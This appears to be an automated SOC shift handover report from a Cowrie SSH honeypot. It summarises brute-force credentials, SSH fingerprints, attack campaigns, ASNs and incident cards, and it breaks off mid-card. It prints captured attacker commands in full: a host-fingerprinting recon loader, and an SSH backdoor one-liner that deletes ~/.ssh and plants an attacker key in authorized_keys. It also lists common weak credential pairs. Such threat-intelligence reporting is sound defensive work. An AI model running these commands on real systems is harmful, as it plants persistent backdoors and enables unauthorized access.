# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-11 |
| **Generated At** | 2026-07-11T14:58:51Z |
| **Shift Time** | 14:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **202** |
| Confirmed Threats | **182** |
| False Positives Filtered | **20** (9.9%) |
| Unique Attacker IPs | **73** |
| Countries of Origin | **23** |
| High Severity Cases | **85** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **117** |
| Malware Samples Analyzed | **4** HIGH · **35** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **124** |
| Unique Credential Pairs | **64** |
| Unique Usernames | **19** |
| Unique Passwords | **51** |
| Successful Auth Pairs | **93** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `support` | 35 |
| `admin` | 21 |
| `root` | 18 |
| `administrator` | 6 |
| `guest` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 24 |
| `1234567` | 6 |
| `1988` | 5 |
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 24 |
| `root` | `1988` | 5 |
| `guest` | `1234567` | 5 |
| `345gs5662d34` | `345gs5662d34` | 5 |
| `support` | `99999` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `21` | `195.178.110.228` | 2026-07-11T12:55:13 |
| `support` | `support2006` | `10.0.0.73` | 2026-07-11T12:55:25 |
| `admin` | `321` | `195.178.110.228` | 2026-07-11T12:56:58 |
| `admin` | `654321` | `195.178.110.228` | 2026-07-11T12:58:40 |
| `admin` | `P@ssw0rd` | `195.178.110.228` | 2026-07-11T13:00:17 |
| `admin` | `Password` | `195.178.110.228` | 2026-07-11T13:01:59 |
| `admin` | `admin` | `195.178.110.228` | 2026-07-11T13:03:40 |
| `admin` | `admin12` | `195.178.110.228` | 2026-07-11T13:05:26 |
| `root` | `id` | `10.0.0.73` | 2026-07-11T13:06:14 |
| `supervisor` | `5` | `122.160.15.31` | 2026-07-11T13:06:52 |
| `supervisor` | `5` | `65.20.217.64` | 2026-07-11T13:07:01 |
| `admin` | `admin123` | `195.178.110.228` | 2026-07-11T13:07:12 |
| `admin` | `admin2026` | `195.178.110.228` | 2026-07-11T13:08:57 |
| `support` | `support` | `176.53.159.196` | 2026-07-11T13:09:50 |
| `support` | `support` | `10.0.0.73` | 2026-07-11T13:10:04 |
| `root` | `id` | `185.242.3.195` | 2026-07-11T13:10:35 |
| `admin` | `letmein` | `195.178.110.228` | 2026-07-11T13:10:43 |
| `admin` | `pa$w0rd` | `195.178.110.228` | 2026-07-11T13:12:28 |
| `admin` | `passw0rd` | `195.178.110.228` | 2026-07-11T13:14:17 |
| `admin` | `password` | `195.178.110.228` | 2026-07-11T13:16:11 |
| `root` | `1988` | `153.37.177.219` | 2026-07-11T13:17:53 |
| `root` | `1988` | `213.230.65.53` | 2026-07-11T13:18:05 |
| `admin` | `qwerty` | `195.178.110.228` | 2026-07-11T13:18:14 |
| `support` | `1313` | `10.0.0.73` | 2026-07-11T13:19:32 |
| `administrator` | `123456` | `195.178.110.228` | 2026-07-11T13:20:25 |
| `root` | `1988` | `177.135.206.10` | 2026-07-11T13:21:40 |
| `root` | `1988` | `83.239.0.202` | 2026-07-11T13:21:52 |
| `root` | `1988` | `10.0.0.73` | 2026-07-11T13:22:08 |
| `administrator` | `P@ssw0rd` | `195.178.110.228` | 2026-07-11T13:22:21 |
| `administrator` | `administrator` | `195.178.110.228` | 2026-07-11T13:24:08 |
| `root` | `buster` | `185.242.3.195` | 2026-07-11T13:24:46 |
| `administrator` | `administrator123` | `195.178.110.228` | 2026-07-11T13:25:55 |
| `administrator` | `passw0rd` | `195.178.110.228` | 2026-07-11T13:27:40 |
| `guest` | `1234567` | `200.159.14.187` | 2026-07-11T13:28:52 |
| `guest` | `1234567` | `78.187.230.168` | 2026-07-11T13:29:03 |
| `administrator` | `password` | `195.178.110.228` | 2026-07-11T13:29:21 |
| `ansible` | `123456` | `195.178.110.228` | 2026-07-11T13:31:06 |
| `guest` | `1234567` | `115.241.228.34` | 2026-07-11T13:32:26 |
| `guest` | `1234567` | `58.17.128.7` | 2026-07-11T13:32:35 |
| `guest` | `1234567` | `10.0.0.73` | 2026-07-11T13:32:44 |
| `ansible` | `ansible` | `195.178.110.228` | 2026-07-11T13:32:50 |
| `ansible` | `ansible123` | `195.178.110.228` | 2026-07-11T13:34:36 |
| `ansible` | `passw0rd` | `195.178.110.228` | 2026-07-11T13:36:17 |
| `ansible` | `password` | `195.178.110.228` | 2026-07-11T13:38:00 |
| `root` | `buster` | `10.0.0.73` | 2026-07-11T13:39:28 |
| `apache` | `P@ssw0rd` | `195.178.110.228` | 2026-07-11T13:39:43 |
| `apache` | `apache` | `195.178.110.228` | 2026-07-11T13:41:25 |
| `apache` | `password` | `195.178.110.228` | 2026-07-11T13:43:06 |
| `backup` | `123qwe` | `195.178.110.228` | 2026-07-11T13:44:53 |
| `test` | `test1234567890` | `203.129.225.4` | 2026-07-11T13:45:12 |
| `admin` | `admin` | `47.89.228.114` | 2026-07-11T13:45:18 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-11T13:45:19 |
| `test` | `test1234567890` | `10.0.0.73` | 2026-07-11T13:45:40 |
| `backup` | `54321` | `195.178.110.228` | 2026-07-11T13:46:41 |
| `root` | `Lt12345678` | `10.0.0.73` | 2026-07-11T13:46:54 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-11T13:46:58 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T13:46:59 |
| `root` | `590426` | `10.0.0.73` | 2026-07-11T13:47:56 |
| `backup` | `backup` | `195.178.110.228` | 2026-07-11T13:48:29 |
| `andreas` | `andreas` | `10.0.0.73` | 2026-07-11T13:50:33 |
| `andreas` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T13:50:35 |
| `testuser` | `1234567` | `10.0.0.73` | 2026-07-11T13:51:45 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-11T13:53:31 |
| `admin` | `admin6` | `60.249.252.94` | 2026-07-11T13:55:06 |
| `ubuntu` | `1qazcde3` | `185.242.3.195` | 2026-07-11T13:58:04 |
| `admin` | `admin6` | `220.128.137.164` | 2026-07-11T13:58:46 |
| `admin` | `admin6` | `10.0.0.73` | 2026-07-11T13:59:09 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-11T14:06:54 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-11T14:06:54 |
| `support` | `99999` | `111.39.167.59` | 2026-07-11T14:07:53 |
| `ubnt` | `ubnt12` | `191.36.152.28` | 2026-07-11T14:10:38 |
| `support` | `99999` | `77.106.78.215` | 2026-07-11T14:11:21 |
| `support` | `99999` | `60.174.39.82` | 2026-07-11T14:11:34 |
| `support` | `99999` | `10.0.0.73` | 2026-07-11T14:11:51 |
| `ubuntu` | `1qazcde3` | `10.0.0.73` | 2026-07-11T14:12:43 |
| `ubnt` | `ubnt12` | `10.0.0.73` | 2026-07-11T14:14:32 |
| `support` | `123456789123456789` | `197.242.170.10` | 2026-07-11T14:21:17 |
| `support` | `123456789123456789` | `178.178.222.59` | 2026-07-11T14:21:26 |
| `support` | `123456789123456789` | `115.241.228.34` | 2026-07-11T14:24:58 |
| `mihail` | `mihail` | `69.6.222.101` | 2026-07-11T14:28:00 |
| `345gs5662d34` | `345gs5662d34` | `69.6.222.101` | 2026-07-11T14:28:03 |
| `mihail` | `3245gs5662d34` | `69.6.222.101` | 2026-07-11T14:28:03 |
| `kexiao` | `kexiao` | `185.242.3.195` | 2026-07-11T14:31:22 |
| `admin` | `admin321` | `200.115.234.24` | 2026-07-11T14:32:26 |
| `345gs5662d34` | `345gs5662d34` | `200.115.234.24` | 2026-07-11T14:32:29 |
| `admin` | `3245gs5662d34` | `200.115.234.24` | 2026-07-11T14:32:30 |
| `sshd` | `cms500` | `64.72.74.162` | 2026-07-11T14:40:14 |
| `sshd` | `cms500` | `125.23.255.134` | 2026-07-11T14:40:30 |
| `sammy` | `a` | `111.68.98.152` | 2026-07-11T14:46:04 |
| `345gs5662d34` | `345gs5662d34` | `111.68.98.152` | 2026-07-11T14:46:08 |
| `sammy` | `3245gs5662d34` | `111.68.98.152` | 2026-07-11T14:46:09 |
| `kexiao` | `kexiao` | `10.0.0.73` | 2026-07-11T14:46:18 |
| `root` | `P@ssword123` | `10.0.0.73` | 2026-07-11T14:51:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **202** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 61 |
| libssh | 24 |
| OpenSSH | 23 |
| Paramiko (Python) | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 31 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 23 | 22 |
| `eff4c24daffc...` | Modern SSH client | 12 | 1 |
| `16443846184e...` | Generic scanner | 9 | 3 |
| `f555226df196...` | Mirai/variant | 9 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 31 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 23 | 22 | Mirai/variant |
| `95420f9d932d...` | libssh | 14 | 4 | — |
| `eff4c24daffc...` | Go SSH scanner | 12 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 9 | 3 | Generic scanner |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 6 | 1 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 31 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `111.68.98.152`, `69.6.222.101`, `200.115.234.24`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **73** |
| Unique ASNs | **48** |
| High-Risk ASNs | **39** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 10 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS213790` | Limited Network LTD | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (85)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-29e00095584c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:55 |
| **Last Seen** | 2026-07-11 12:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:55:11` | `cowrie.session.connect` |
| `2026-07-11 12:55:11` | `cowrie.client.version` |
| `2026-07-11 12:55:11` | `cowrie.client.kex` |
| `2026-07-11 12:55:13` | `cowrie.login.success` |
| `2026-07-11 12:55:14` | `cowrie.session.params` |
| `2026-07-11 12:55:14` | `cowrie.command.input` |
| `2026-07-11 12:55:14` | `cowrie.command.input` |
| `2026-07-11 12:55:14` | `cowrie.command.input` |
| `2026-07-11 12:55:14` | `cowrie.command.input` |
| `2026-07-11 12:55:14` | `cowrie.command.input` |
| `2026-07-11 12:55:14` | `cowrie.command.success` |
| `2026-07-11 12:55:14` | `cowrie.command.input` |
| `2026-07-11 12:55:14` | `cowrie.command.input` |
| `2026-07-11 12:55:14` | `cowrie.command.input` |
| `2026-07-11 12:55:14` | `cowrie.command.input` |
| `2026-07-11 12:55:15` | `cowrie.log.closed` |
| `2026-07-11 12:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d0dc6cf404d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:56 |
| **Last Seen** | 2026-07-11 12:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:56:55` | `cowrie.session.connect` |
| `2026-07-11 12:56:56` | `cowrie.client.version` |
| `2026-07-11 12:56:56` | `cowrie.client.kex` |
| `2026-07-11 12:56:58` | `cowrie.login.success` |
| `2026-07-11 12:56:59` | `cowrie.session.params` |
| `2026-07-11 12:56:59` | `cowrie.command.input` |
| `2026-07-11 12:56:59` | `cowrie.command.input` |
| `2026-07-11 12:56:59` | `cowrie.command.input` |
| `2026-07-11 12:56:59` | `cowrie.command.input` |
| `2026-07-11 12:57:00` | `cowrie.command.input` |
| `2026-07-11 12:57:00` | `cowrie.command.success` |
| `2026-07-11 12:57:00` | `cowrie.command.input` |
| `2026-07-11 12:57:00` | `cowrie.command.input` |
| `2026-07-11 12:57:00` | `cowrie.command.input` |
| `2026-07-11 12:57:00` | `cowrie.command.input` |
| `2026-07-11 12:57:00` | `cowrie.log.closed` |
| `2026-07-11 12:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76a025063d77

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 12:58 |
| **Last Seen** | 2026-07-11 12:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 12:58:37` | `cowrie.session.connect` |
| `2026-07-11 12:58:38` | `cowrie.client.version` |
| `2026-07-11 12:58:38` | `cowrie.client.kex` |
| `2026-07-11 12:58:40` | `cowrie.login.success` |
| `2026-07-11 12:58:42` | `cowrie.session.params` |
| `2026-07-11 12:58:42` | `cowrie.command.input` |
| `2026-07-11 12:58:42` | `cowrie.command.input` |
| `2026-07-11 12:58:42` | `cowrie.command.input` |
| `2026-07-11 12:58:42` | `cowrie.command.input` |
| `2026-07-11 12:58:42` | `cowrie.command.input` |
| `2026-07-11 12:58:42` | `cowrie.command.success` |
| `2026-07-11 12:58:42` | `cowrie.command.input` |
| `2026-07-11 12:58:42` | `cowrie.command.input` |
| `2026-07-11 12:58:42` | `cowrie.command.input` |
| `2026-07-11 12:58:42` | `cowrie.command.input` |
| `2026-07-11 12:58:43` | `cowrie.log.closed` |
| `2026-07-11 12:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-890b70994fcf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:00 |
| **Last Seen** | 2026-07-11 13:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:00:15` | `cowrie.session.connect` |
| `2026-07-11 13:00:16` | `cowrie.client.version` |
| `2026-07-11 13:00:16` | `cowrie.client.kex` |
| `2026-07-11 13:00:17` | `cowrie.login.success` |
| `2026-07-11 13:00:19` | `cowrie.session.params` |
| `2026-07-11 13:00:19` | `cowrie.command.input` |
| `2026-07-11 13:00:19` | `cowrie.command.input` |
| `2026-07-11 13:00:19` | `cowrie.command.input` |
| `2026-07-11 13:00:19` | `cowrie.command.input` |
| `2026-07-11 13:00:19` | `cowrie.command.input` |
| `2026-07-11 13:00:19` | `cowrie.command.success` |
| `2026-07-11 13:00:19` | `cowrie.command.input` |
| `2026-07-11 13:00:19` | `cowrie.command.input` |
| `2026-07-11 13:00:19` | `cowrie.command.input` |
| `2026-07-11 13:00:19` | `cowrie.command.input` |
| `2026-07-11 13:00:20` | `cowrie.log.closed` |
| `2026-07-11 13:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-910b8a171f29

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:01 |
| **Last Seen** | 2026-07-11 13:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:01:56` | `cowrie.session.connect` |
| `2026-07-11 13:01:57` | `cowrie.client.version` |
| `2026-07-11 13:01:57` | `cowrie.client.kex` |
| `2026-07-11 13:01:59` | `cowrie.login.success` |
| `2026-07-11 13:02:01` | `cowrie.session.params` |
| `2026-07-11 13:02:01` | `cowrie.command.input` |
| `2026-07-11 13:02:01` | `cowrie.command.input` |
| `2026-07-11 13:02:01` | `cowrie.command.input` |
| `2026-07-11 13:02:01` | `cowrie.command.input` |
| `2026-07-11 13:02:01` | `cowrie.command.input` |
| `2026-07-11 13:02:01` | `cowrie.command.success` |
| `2026-07-11 13:02:01` | `cowrie.command.input` |
| `2026-07-11 13:02:01` | `cowrie.command.input` |
| `2026-07-11 13:02:01` | `cowrie.command.input` |
| `2026-07-11 13:02:01` | `cowrie.command.input` |
| `2026-07-11 13:02:01` | `cowrie.log.closed` |
| `2026-07-11 13:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b575b2fc8f0e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:03 |
| **Last Seen** | 2026-07-11 13:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:03:38` | `cowrie.session.connect` |
| `2026-07-11 13:03:38` | `cowrie.client.version` |
| `2026-07-11 13:03:38` | `cowrie.client.kex` |
| `2026-07-11 13:03:40` | `cowrie.login.success` |
| `2026-07-11 13:03:42` | `cowrie.session.params` |
| `2026-07-11 13:03:42` | `cowrie.command.input` |
| `2026-07-11 13:03:42` | `cowrie.command.input` |
| `2026-07-11 13:03:42` | `cowrie.command.input` |
| `2026-07-11 13:03:42` | `cowrie.command.input` |
| `2026-07-11 13:03:42` | `cowrie.command.input` |
| `2026-07-11 13:03:42` | `cowrie.command.success` |
| `2026-07-11 13:03:42` | `cowrie.command.input` |
| `2026-07-11 13:03:42` | `cowrie.command.input` |
| `2026-07-11 13:03:42` | `cowrie.command.input` |
| `2026-07-11 13:03:42` | `cowrie.command.input` |
| `2026-07-11 13:03:43` | `cowrie.log.closed` |
| `2026-07-11 13:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f0d7519e72

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:05 |
| **Last Seen** | 2026-07-11 13:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

